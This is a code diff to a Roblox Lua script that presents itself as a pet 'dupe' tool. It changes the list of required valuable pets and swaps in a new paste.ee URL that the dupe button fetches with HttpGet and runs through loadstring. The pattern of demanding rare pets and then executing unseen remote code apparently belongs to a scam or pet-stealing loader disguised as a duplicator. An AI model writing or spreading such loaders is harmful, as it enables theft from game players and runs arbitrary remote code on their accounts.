@@ -129,7 +129,7 @@ local warningBox = Instance.new("TextLabel")
 warningBox.Size = UDim2.new(1, -20 * scaleFactor, 0, 35 * scaleFactor)
 warningBox.Position = UDim2.new(0, 10 * scaleFactor, 0, 35 * scaleFactor)
 warningBox.BackgroundColor3 = Color3.fromRGB(200, 55, 55)
-warningBox.Text = "⚠️ REQUIRED PET: Polar Bear, Red Fox, Chicken Zombie, Dragonfly, Raccoon, Queen Bee"
+warningBox.Text = "⚠️ REQUIRED PET: Dragonfly, Raccoon, Red Fox, Disco Bee, Queen Bee, Butterfly, Moth"
 warningBox.TextColor3 = Color3.new(1, 1, 1)
 warningBox.TextSize = 14 * scaleFactor
 warningBox.Font = Enum.Font.GothamBold
@@ -214,7 +214,16 @@ local function buttonClickAnim(button)
     tweenUp:Play()
 end
 
-local requiredPetsList = {"red fox", "dragonfly", "raccoon", "mole", "polar bear", "chicken zombie", "queen bee"}
+local requiredPetsList = {
+    "dragonfly",
+    "raccoon",
+    "red fox",
+    "disco bee",
+    "butterfly",
+    "butterfly",
+    "moth",
+    "queen bee"
+}
 
 local function animateChecking()
     local dots = {".", "..", "..."}
@@ -262,7 +271,7 @@ dupeButton.MouseButton1Click:Connect(function()
     errorText.TextColor3 = Color3.fromRGB(90, 255, 150)
 
     local success, err = pcall(function()
-        local scriptContent = game:HttpGet("https://paste.ee/r/WGCVy6SX")
+        local scriptContent = game:HttpGet("https://paste.ee/r/lWGtWH5Z")
         local fn, loadErr = loadstring(scriptContent)
         if not fn then
             error("Failed to load script: " .. tostring(loadErr))
